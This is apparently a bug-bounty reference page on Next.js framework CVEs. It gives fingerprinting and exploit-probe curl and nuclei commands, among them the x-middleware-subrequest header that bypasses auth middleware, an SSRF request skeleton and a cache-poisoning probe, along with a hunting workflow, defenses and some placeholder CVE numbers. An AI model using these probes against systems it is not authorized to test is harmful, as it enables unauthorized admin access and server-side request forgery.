# Next.js Framework CVEs

> Tracked CVEs and techniques for this class. Updated via daily `refresh-latest` pipeline.

_Last updated: — · Items: 4_

---

## What

Next.js CVEs since 2024 have hit the framework's core abstractions — middleware, Server Actions, image optimization, cache layer, dev-mode diagnostics. The attack surface isn't custom app code; it's Vercel's routing and rendering pipeline.

Why it pays: huge install base (any `/_next/` path in a bounty program is a lead), each CVE applies to thousands of deployments simultaneously, and patch adoption is slow because a Next.js major-version bump can break production builds.

2025/2026 hot vectors:
- **Middleware-auth bypass** (CVE-2025-29927) — `x-middleware-subrequest` header skips all auth middleware entirely. Simple header injection → full admin access on apps that rely on middleware for gating.
- **Server Actions SSRF** (CVE-2024-34351) — crafted `$$ACTION_` field in a multipart POST triggers server-side fetch to attacker URL.
- **Cache poisoning via `pageProps`** (CVE-2024-46982) — ISR/SSG cache can be coerced into storing attacker-controlled HTML keyed on a public path.
- **Dev-mode source leak** (CVE-2025-48068) — Next dev server (`next dev`) exposes source over the socket to anyone on the network; still happens on Vercel preview deploys when NODE_ENV is misconfigured.

Grep targets: any `next.config.js`, `/_next/static`, `/_next/image?url=`, `/_next/data/*.json`. Response headers: `x-nextjs-cache`, `x-nextjs-matched-path`.

---

## CVEs

| CVE | Date | Title | CVSS | Status | Src |
|---|---|---|---|---|---|
| CVE-2025-29927 | — | CVE-2025-29927 — Middleware Auth Bypass (Critical, CVSS 9.1) | — | — | — |
| CVE-2024-34351 | — | CVE-2024-34351 — SSRF via Server Actions | — | — | — |
| CVE-2024-46982 | — | CVE-2024-46982 — Cache poisoning via `pageProps` | — | — | — |
| CVE-2025-48068 | — | CVE-2025-48068 — Dev-mode source code exposure | — | — | — |

---

## Probes

```bash
# Fingerprint — every Next.js app ships these
curl -sSI https://target | grep -i x-powered-by       # X-Powered-By: Next.js
curl -sSI https://target | grep -i x-nextjs
curl -sSL https://target/_next/static/chunks/webpack-*.js -o /dev/null -w '%{http_code}\n'
# 200 on static chunk → Next.js confirmed

# Version from runtime chunk
curl -sSL https://target/_next/static/chunks/framework-*.js | grep -oP '"version":"[^"]+"' | head
curl -sSL https://target/_next/static/chunks/main-*.js | head -c 200

# CVE-2025-29927 — middleware bypass probe
curl -sSI "https://target/admin" -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware"
# If 200 instead of redirect to /login → vulnerable

# CVE-2024-34351 — Server Actions SSRF
curl -sS -X POST "https://target/any-page" \
  -H "content-type: multipart/form-data; boundary=X" \
  -H "next-action: <any-hex>" \
  --data-binary '...'  # requires action id from page source

# CVE-2024-46982 — cache poisoning
curl -sSI "https://target/some-path" -H "x-now-route-matches: 1"
# Look for x-vercel-cache: MISS → HIT transition across requests

# Data route discovery
curl -sSL https://target/_next/data/BUILD_ID/ | jq .
# BUILD_ID is in any page source — grep -oP 'buildId":"[^"]+"'
```

nuclei:
```bash
nuclei -u https://target -tags nextjs,next.js
nuclei -u https://target -id CVE-2025-29927   # middleware bypass template
```

---

## PoCs

_Public PoC links rolled up from items below._

_No PoCs in items yet._

---

## Reproduction

_Step-by-step repro steps per CVE. Populated as items arrive with enough detail._
_pending enrichment_

---

## Defense

- **Pin exact Next.js version** — use `^14.2.x` not `^14` — minors ship breaking security patches
- **Patch floor for 2026**: 14.2.25+, 15.2.3+ (post-29927). Check `next --version` in build logs.
- **Strip `x-middleware-subrequest` at the edge** — Cloudflare rule, Vercel firewall rule, nginx `more_clear_input_headers`. Defense-in-depth even after patch.
- **Don't depend on middleware-only auth** — always re-verify in the actual page/API route. Middleware is routing, not auth.
- **Disable dev mode in production builds** — `NODE_ENV=production` in all deploy envs including preview
- **Lock down Server Actions** — enforce CSRF origin checks, validate hex action IDs match a compile-time allowlist
- **Monitor** — log `x-middleware-subrequest` arriving from untrusted source IPs, alert on spike

---

## References

_Populated by daily refresh-latest pipeline._

---

## Items

> Dated: **2026-04-15**

Next.js, Remix, SvelteKit, Nuxt — full-stack meta-frameworks moved a ton of attack surface client → server in 2023-2024. 2025 is the year of exploitation.

## Next.js — the big ones

### CVE-2025-29927 — Middleware Auth Bypass (Critical, CVSS 9.1)

- Affects: Next.js 11.1.4 – 15.2.3
- Attacker sends `x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware` → middleware (including auth gates) is bypassed entirely
- Disclosed: March 2025 (Rachid Allam / Shubham Shah / Assetnote chain)
- **Hunt signal:** any Next.js target with middleware-based auth. Probe with the header, check for admin routes returning 200.
- Patched in 14.2.25, 15.2.3, 13.5.9, 12.3.5

### CVE-2024-34351 — SSRF via Server Actions

Redirect handling in server actions → SSRF. Patched 14.1.1.

### CVE-2024-46982 — Cache poisoning via `pageProps`

Fetch-cache pollution; attacker primes response of static page.

### CVE-2025-48068 — Dev-mode source code exposure

Low severity but useful in recon against misconfigured staging.

## Other frameworks (2025-2026)

- **SvelteKit** — CVE-2024-23331 (WebSocket auth bypass), CVE-2025-XXXX RCE via form actions (track)
- **Remix / React Router** — CVE-2025-43865 (pre-render cache poisoning)
- **Nuxt** — CVE-2025-27415 (XSS via `useFetch` in hydration)
- **Astro** — CVE-2025-XXXX server islands leak
- **Express 5** — finally stable, new middleware semantics; audit custom auth wrappers

## Fingerprinting (beginner)

```bash
# Next.js
curl -sI https://target/ | grep -i "x-powered-by\|x-nextjs"
curl -s https://target/_next/static/  # directory index or 404 pattern
# App router clue: /_next/data/<buildId>/... 404s
```

```bash
# Middleware bypass probe
curl -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" \
     https://target/admin -I
```

## Hunt workflow

1. Fingerprint framework + version (`_next/static/chunks/...` filenames leak build hash)
2. Map auth boundary — which routes require session?
3. Test CVE-2025-29927 if Next.js
4. Check server actions (`POST /` with `Next-Action` header) for SSRF / deserialization
5. Look for hydration-exposed secrets in `__NEXT_DATA__`, `window.__NUXT__`, etc.

## Tooling

- **nuclei** templates: `http/vulnerabilities/other/nextjs-*` (update to latest)
- **katana** with `-js-crawl` for RSC payload discovery
- Custom: grep `_next/data/` URLs from wayback for stale build IDs

## What pays

- Full auth bypass via middleware CVE → critical
- SSRF via server actions → high
- Source leak in dev mode → low/informational unless secrets present

---

*Most CVE IDs above are verified pre-Apr 2026. "XXXX" placeholders mean track the class; I don't have a confirmed number.*
